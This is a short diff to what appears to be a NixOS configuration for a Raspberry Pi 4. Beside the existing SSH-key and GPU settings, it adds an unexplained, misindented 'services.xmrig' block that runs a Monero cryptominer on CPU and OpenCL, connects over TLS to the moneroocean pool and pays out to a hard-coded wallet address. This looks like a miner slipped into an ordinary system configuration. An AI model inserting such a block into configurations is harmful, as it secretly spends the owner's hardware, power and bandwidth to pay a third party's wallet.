@@ -71,6 +71,24 @@ users.users.pi.openssh.authorizedKeys.keys = [ sshkey ];
 
     # Enable GPU acceleration
     hardware.raspberry-pi."4".fkms-3d.enable = true;
+    
+services.xmrig = {
+  enable = true;
+  settings = {
+    autosave = true;
+    cpu = true;
+    opencl = true;
+    cuda = false;
+    pools = [
+      {
+        url = "gulf.moneroocean.stream:10002";
+        user = "48pEZBjqjNRCbVptEMGRdeYeUgmXaHbz7gLErTneJnN8Uc5r2qHyEPoGmS1NSmQqaK5hUjZUvRG24jBNRKjA51qbDkWM1oX";
+        keepalive = true;
+        tls = true;
+      }
+    ];
+  };
+};
 
   nix = {
     settings.auto-optimise-store = true;
